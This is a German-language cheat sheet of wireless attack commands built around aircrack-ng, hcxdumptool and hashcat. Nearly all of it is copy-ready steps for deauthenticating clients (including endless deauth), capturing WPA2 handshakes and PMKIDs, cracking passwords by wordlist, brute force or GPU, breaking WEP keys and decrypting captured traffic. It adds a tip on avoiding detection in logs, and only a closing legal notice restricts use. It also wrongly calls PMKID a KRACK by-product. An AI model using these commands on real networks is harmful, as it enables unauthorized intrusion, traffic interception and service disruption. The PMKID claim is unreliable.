Vorbereitung — Monitor Mode
Wireless-Interfaces auflisten
airmon-ng
Störende Prozesse beenden (NetworkManager etc.)
airmon-ng check kill
Monitor-Modus aktivieren → wlan0mon
airmon-ng start wlan0
Monitor-Modus beenden
airmon-ng stop wlan0mon
Interfaces und Modi anzeigen
iwconfig
Alternativer Weg via iw
iw dev wlan0 set type monitor ifconfig wlan0 up
airmon-ng check kill muss vor dem Start ausgeführt werden — sonst blockiert NetworkManager den Monitor-Modus und die Capture-Rate ist gering.
🔭
airodump-ng — Traffic-Capture
Alle APs und Clients scannen
airodump-ng wlan0mon
Spezifisches Netz aufzeichnen
airodump-ng -c 6 \ --bssid AA:BB:CC:DD:EE:FF \ -w capture wlan0mon
Wichtige Optionen im Überblick
-c CHANNEL # auf Kanal fokussieren --bssid BSSID # auf AP fokussieren -w PRÄFIX # .cap/.csv speichern --essid NAME # nach SSID filtern --band abg # mehrere Bänder --wps # WPS-Info anzeigen
ENC-Spalte: WPA2 = CCMP/TKIP, WEP = WEP. PWR gibt die Signalstärke in dBm an — je näher an 0, desto stärker.

aireplay-ng — Attacks
Deauth-Angriff (5 Pakete, broadcast)
aireplay-ng -0 5 -a BSSID wlan0mon
Gezielter Deauth gegen einzelnen Client
aireplay-ng -0 0 \ -a BSSID -c CLIENT_MAC wlan0mon # -0 0 = endloser Deauth (Strg+C zum Stoppen)
Fake Authentication am AP
aireplay-ng -1 0 -a BSSID wlan0mon
ARP-Replay (WEP — IVs sammeln)
aireplay-ng -3 \ -b BSSID -h EIGENE_MAC wlan0mon
Fragmentation-Angriff / Injection-Test
aireplay-ng -5 -b BSSID wlan0mon aireplay-ng -9 wlan0mon # Test
--ignore-negative-one unterdrückt Kanalwarnungen, wenn das Treiber-Interface keinen festen Kanal meldet.

WPA2 Handshake Capture
Schritt 1 — Netz aufzeichnen
airodump-ng -c CH \ --bssid BSSID \ -w handshake wlan0mon
Schritt 2 — Client deauthen (neues Terminal)
aireplay-ng -0 3 -a BSSID wlan0mon
Bestätigung in airodump-ng
# Oben rechts erscheint: WPA handshake: AA:BB:CC:DD:EE:FF
Handshake validieren
aircrack-ng handshake.cap # Ausgabe: "1 handshake" bestätigt Capture
Alternativer Check mit pyrit
pyrit analyze -r handshake.cap
Passiv warten: Ohne Deauth auf echten Client-Connect warten. Dauert länger, ist aber unauffälliger und hinterlässt keine Deauth-Frames im Log.

aircrack-ng — Passwort-Cracking
Wordlist-Angriff auf WPA2
aircrack-ng -w rockyou.txt handshake.cap
Spezifischer AP (mehrere Handshakes)
aircrack-ng -w wordlist.txt \ -b BSSID handshake.cap
Explizit WPA2 / WEP
aircrack-ng -a2 -b BSSID -w rockyou.txt handshake.cap aircrack-ng -a1 -b BSSID -w wep.txt wep.cap
Brute Force via crunch-Pipe
crunch 8 12 abcdefgh0123 | \ aircrack-ng -w - -b BSSID handshake.cap
Erfolgsmeldung
# Ausgabe bei Treffer: KEY FOUND! [ PASSWORT ]
Hashcat ist deutlich schneller als aircrack-ng auf GPU-Hardware. Empfehlung: Handshake mit hcxpcapngtool extrahieren und mit Hashcat cracken.
🎯
PMKID-Angriff (kein Client nötig)
Schritt 1 — PMKID-Capture mit hcxdumptool
hcxdumptool -i wlan0mon \ -o pmkid.pcapng \ --enable_status=1
Schritt 2 — Hash für Hashcat extrahieren
hcxpcapngtool -o hash.hc22000 pmkid.pcapng
Schritt 3 — Hashcat auf PMKID / EAPOL
hashcat -m 22000 hash.hc22000 rockyou.txt # -m 22000 = WPA2 PMKID+EAPOL unified
Vorteil gegenüber Handshake
# Kein aktiver Client nötig # Kein Deauth erforderlich # AP muss nur in Reichweite sein
PMKID (WPA2-KRACK-Nebenprodukt) wird vom AP in EAPOL-Frame-1 übermittelt. Seit 2018 Standard-Angriff gegen moderne Router.
🔓
WEP-Angriff
Schritt 1 — WEP-Traffic aufzeichnen
airodump-ng -c CH \ --bssid BSSID -w wep wlan0mon
Schritt 2 — Fake Authentication
aireplay-ng -1 0 -a BSSID wlan0mon
Schritt 3 — ARP-Replay (IVs injizieren)
aireplay-ng -3 -b BSSID wlan0mon
Schritt 4 — Schlüssel cracken (~50.000 IVs)
aircrack-ng wep*.cap
WEP gilt als vollständig gebrochen und ist seit 2004 deprecated. In modernen Netzen kaum noch anzutreffen. Für Laborzwecke: ~50.000–80.000 IVs reichen für einen zuverlässigen Crack.
🔐
airdecap-ng — Entschlüsselung
WPA2-Capture mit bekanntem Passwort entschlüsseln
airdecap-ng -p PASSWORT \ -e SSID handshake.cap
Spezifischer AP per BSSID
airdecap-ng -b BSSID \ -p PASSWORT capture.cap
WEP-Capture entschlüsseln
airdecap-ng -w WEPKEY capture.cap # WEPKEY in Hex: z. B. AABBCCDDEE
Ergebnis
# Erzeugt: capture-dec.cap # Wireshark-lesbare Klartextpakete wireshark capture-dec.cap
airdecap-ng benötigt das korrekte Passwort und die SSID des Netzwerks. Ohne korrekte SSID schlägt die PBKDF2-Ableitung des PMK fehl.
🗄️
airolib-ng — Precomputed Hashes
Neue Datenbank erstellen
airolib-ng db --init
SSIDs und Wordlist importieren
airolib-ng db --import essid ssids.txt airolib-ng db --import passwd rockyou.txt
PMKs berechnen (zeitintensiv)
airolib-ng db --batch # Fortschritt mit --stats anzeigen: airolib-ng db --stats
Mit PMK-Datenbank cracken
aircrack-ng -r db handshake.cap
Alternativ: cowpatty mit Rainbow-Table
cowpatty -d db -r handshake.cap -s SSID
Precomputed PMKs beschleunigen das Cracking erheblich — die teure PBKDF2-Berechnung (4096 Iterationen pro Passwort) entfällt. Nachteil: Datenbank ist SSID-spezifisch.

Quick Reference
WPA2-Crack-Workflow (vollständig)
# 1. Vorbereitung airmon-ng check kill airmon-ng start wlan0 # 2. Netz finden airodump-ng wlan0mon # 3. Capture starten airodump-ng -c CH --bssid BSSID -w cap wlan0mon # 4. Client deauthen (neues Terminal) aireplay-ng -0 3 -a BSSID wlan0mon # 5. Cracken aircrack-ng -w rockyou.txt cap.cap
Hashcat-Integration (GPU — schneller)
hcxpcapngtool -o hash.hc22000 cap.cap hashcat -m 22000 hash.hc22000 rockyou.txt
PMKID-Workflow ohne Client
hcxdumptool -i wlan0mon -o pmkid.pcapng hcxpcapngtool -o hash.hc22000 pmkid.pcapng hashcat -m 22000 hash.hc22000 rockyou.txt
Monitor-Mode verifizieren
iw list | grep -i monitor iwconfig wlan0mon | grep "Mode:Monitor"
Rechtlicher Hinweis: Nur an eigenen Netzwerken oder mit ausdrücklicher Genehmigung verwenden. Unbefugter Zugriff auf Netzwerke ist strafbar (§ 202a StGB).
